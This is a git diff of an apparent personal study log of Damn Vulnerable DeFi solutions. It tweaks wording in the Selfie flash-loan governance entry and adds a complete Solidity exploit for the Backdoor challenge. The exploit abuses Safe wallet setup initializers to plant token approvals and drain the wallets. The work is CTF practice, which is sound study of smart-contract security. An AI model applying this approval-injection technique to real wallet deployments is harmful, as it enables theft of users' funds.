@@ -164,7 +164,7 @@ contract Exploit{
 #### Selfie
 Issue:
 
-I feel the biggest issue is that the pool is providing the governance token via flash loan; as long as the token exceeds half of the supply, the proposal can be passed.
+I feel the biggest issue is that the pool is providing the governance token via flashloan, as long as the token exceed half of the supply, the proposal can be passed.
 
 ```solidity
     function _hasEnoughVotes(address who) private view returns (bool) {
@@ -245,5 +245,89 @@ contract SelfiePoolExploit {
     }
 }
 ```
+
+
+### 2024.08.31
+
+- Damn Vulnerable DeFi: Backdoor
+
+#### Backdoor
+
+Solve:
+
+```solidity
+    function test_backdoor() public checkSolvedByPlayer {
+        BackdoorAttacker ba = new BackdoorAttacker(recovery, token);
+        ba.attack(
+            address(walletFactory),
+            address(singletonCopy), 
+            address(walletRegistry), 
+            users
+        );
+
+    }
+```
+
+```solidity
+interface ISafe {
+    function setup(
+        address[] calldata _owners,
+        uint256 _threshold,
+        address to,
+        bytes calldata data,
+        address fallbackHandler,
+        address paymentToken,
+        uint256 payment,
+        address payable paymentReceiver
+    ) external;
+}
+import '@openzeppelin/contracts/token/ERC20/IERC20.sol';
+
+contract Approve {
+  function approve(DamnValuableToken token, address spender) external {
+      token.approve(spender, type(uint256).max);
+    }
+}
+
+contract BackdoorAttacker {
+  address recovery;
+  DamnValuableToken token;
+  Approve mApprove;
+
+  constructor(address _recovery, DamnValuableToken _token) {
+    recovery = _recovery;
+    token = _token;
+  }
+
+  function attack(address _walletFactory, address _singletonCopy, address _walletRegistry, address[] calldata _users) external {
+    mApprove = new Approve();
+    for (uint256 i = 0; i < 4; i++) {
+            address[] memory users = new address[](1);
+            users[0] = _users[i];
+            bytes memory initializer = abi.encodeWithSelector(
+                Safe.setup.selector,
+                users,
+                1,
+                mApprove,
+                abi.encodeWithSelector(Approve.approve.selector, token, address(this)),
+                address(0x0),
+                address(0x0),
+                0,
+                address(0x0)
+            );
+
+            SafeProxy proxy = SafeProxyFactory(_walletFactory).createProxyWithCallback(
+                _singletonCopy,
+                initializer,
+                i,
+                IProxyCreationCallback(_walletRegistry)
+            );
+
+            token.transferFrom(address(proxy), recovery, token.balanceOf(address(proxy)));
+        }
+    }  
+}
+```
+
 
 <!-- Content_END -->
